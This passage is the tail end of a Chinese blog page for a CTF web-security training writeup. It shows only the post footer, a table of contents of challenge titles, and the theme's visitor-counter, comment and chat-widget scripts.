class="variable">$url</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$url</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/f605762/">https://noone-hub.github.io/posts/f605762/</a><br><strong>版权声明</strong>：转载请注明出处！</p></div><div></div><footer class="post-footer"><div class="post-tags"> <a href="/tags/web%E5%AE%89%E5%85%A8-%E7%BB%83%E4%B9%A0/" rel="tag"># web安全,练习</a></div><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/posts/40674c1b/" rel="next" title="2019软件测试web安全题目writeup收集"><i class="fa fa-chevron-left"></i> 2019软件测试web安全题目writeup收集</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"> <a href="/posts/d100f3b8/" rel="prev" title="linux qq测试">linux qq测试<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div><div class="comments" id="comments"></div></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc"> Table of Contents</li><li class="sidebar-nav-overview"> Overview</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#安恒训练赛"><span class="nav-number">1.</span> <span class="nav-text">安恒训练赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#常规操作"><span class="nav-number">1.1.</span> <span class="nav-text">常规操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简单的md5"><span class="nav-number">1.2.</span> <span class="nav-text">简单的md5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简单的新闻搜索"><span class="nav-number">1.3.</span> <span class="nav-text">简单的新闻搜索</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#奇怪的恐龙特性"><span class="nav-number">1.4.</span> <span class="nav-text">奇怪的恐龙特性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#md5-crack"><span class="nav-number">1.5.</span> <span class="nav-text">md5 crack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#新的新闻搜索"><span class="nav-number">1.6.</span> <span class="nav-text">新的新闻搜索</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#玩个蛇皮"><span class="nav-number">1.7.</span> <span class="nav-text">玩个蛇皮</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ddcms"><span class="nav-number">1.8.</span> <span class="nav-text">ddcms</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爱い窒息、痛"><span class="nav-number">1.9.</span> <span class="nav-text">爱い窒息、痛</span></a></li></ol></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" alt="NoOne" src="/images/photo.jpg"><p class="site-author-name" itemprop="name">NoOne</p><div class="site-description" itemprop="description">One people that no one know</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"> <a href="/archives/"><span class="site-state-item-count">60</span> <span class="site-state-item-name">posts</span></a></div><div class="site-state-item site-state-tags"> <span class="site-state-item-count">27</span> <span class="site-state-item-name">tags</span></div></nav></div><div class="links-of-author motion-element"><span class="links-of-author-item"><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL05vT25lLWh1Yg==" title="GitHub &amp;rarr; https:&#x2F;&#x2F;github.com&#x2F;NoOne-hub"><i class="fa fa-fw fa-github"></i> GitHub</span></span><span class="links-of-author-item"><span class="exturl" data-url="Tm9PbmU6ZG90YWVyZGF5QGdtYWlsLmNvbQ==" title="E-Mail &amp;rarr; NoOne:dotaerday@gmail.com"><i class="fa fa-fw fa-envelope"></i> E-Mail</span></span></div></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright"> &copy; <span itemprop="copyrightYear">2019</span><span class="with-love"><i class="fa fa-user"></i></span> <span class="author" itemprop="copyrightHolder">NoOne</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-area-chart"></i></span> <span title="Symbols count total">374k</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-coffee"></i></span> <span title="Reading time total">5:40</span></div><script>
  function leancloudSelector(url) {
    return document.getElementById(url).querySelector('.leancloud-visitors-count');
  }
  if (CONFIG.page.isPost) {
    function addCount(Counter) {
      var visitors = document.querySelector('.leancloud_visitors');
      var url = visitors.getAttribute('id').trim();
      var title = visitors.getAttribute('data-flag-title').trim();

      Counter('get', `/classes/Counter?where=${JSON.stringify({ url })}`)
        .then(response => response.json())
        .then(({ results }) => {
          if (results.length > 0) {
            var counter = results[0];
            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
              .then(response => response.json())
              .then(() => {
                leancloudSelector(url).innerText = counter.time + 1;
              })
              .catch(error => {
                console.log('Failed to save visitor count', error);
              })
          } else {
              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
            
          }
        })
        .catch(error => {
          console.log('LeanCloud Counter Error', error);
        });
    }
  } else {
    function showTime(Counter) {
      var visitors = document.querySelectorAll('.leancloud_visitors');
      var entries = [...visitors].map(element => {
        return element.getAttribute('id').trim();
      });

      Counter('get', `/classes/Counter?where=${JSON.stringify({ url: { '$in': entries } })}`)
        .then(response => response.json())
        .then(({ results }) => {
          if (results.length === 0) {
            document.querySelectorAll('.leancloud_visitors .leancloud-visitors-count').forEach(element => {
              element.innerText = 0;
            });
            return;
          }
          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.url;
            var time = item.time;
            leancloudSelector(url).innerText = time;
          }
          for (var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = leancloudSelector(url);
            if (element.innerText == '') {
              element.innerText = 0;
            }
          }
        })
        .catch(error => {
          console.log('LeanCloud Counter Error', error);
        });
    }
  }

  fetch('https://app-router.leancloud.cn/2/route?appId=KHpRP13gAjuU8mAfkHtBxcDF-gzGzoHsz')
    .then(response => response.json())
    .then(({ api_server }) => {
      var Counter = (method, url, data) => {
        return fetch(`https://${api_server}/1.1${url}`, {
          method: method,
          headers: {
            'X-LC-Id': 'KHpRP13gAjuU8mAfkHtBxcDF-gzGzoHsz',
            'X-LC-Key': 'C1z9X6NQu0ES8qiAOF8RaSq3',
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
        });
      };
      if (CONFIG.page.isPost) {
        const localhost = /http:\/\/(localhost|127.0.0.1|0.0.0.0)/;
        if (localhost.test(document.URL)) return;
        addCount(Counter);
      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
        showTime(Counter);
      }
    });
  </script></div></footer></div><script src="/lib/anime.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script src="/js/local-search.js"></script><script src="//code.tidio.co/4fgjfhjokt1utyyp9l0cra3v0uw4uuwf.js"></script><script>
NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
  var GUEST = ['nick', 'mail', 'link'];
  var guest = 'nick,mail,link';
  guest = guest.split(',').filter(item => {
    return GUEST.includes(item);
  });
  new Valine({
    el: '#comments',
    verify: false,
    notify: false,
    appId: 'KHpRP13gAjuU8mAfkHtBxcDF-gzGzoHsz',
    appKey: 'C1z9X6NQu0ES8qiAOF8RaSq3',
    placeholder: "Just go go",
    avatar: 'mm',
    meta: guest,
    pageSize: '10' || 10,
    visitor: false,
    lang: '' || 'zh-cn',
    path: location.pathname,
    recordIP: false,
    serverURLs: ''
  });
}, window.Valine);
</script></body></html>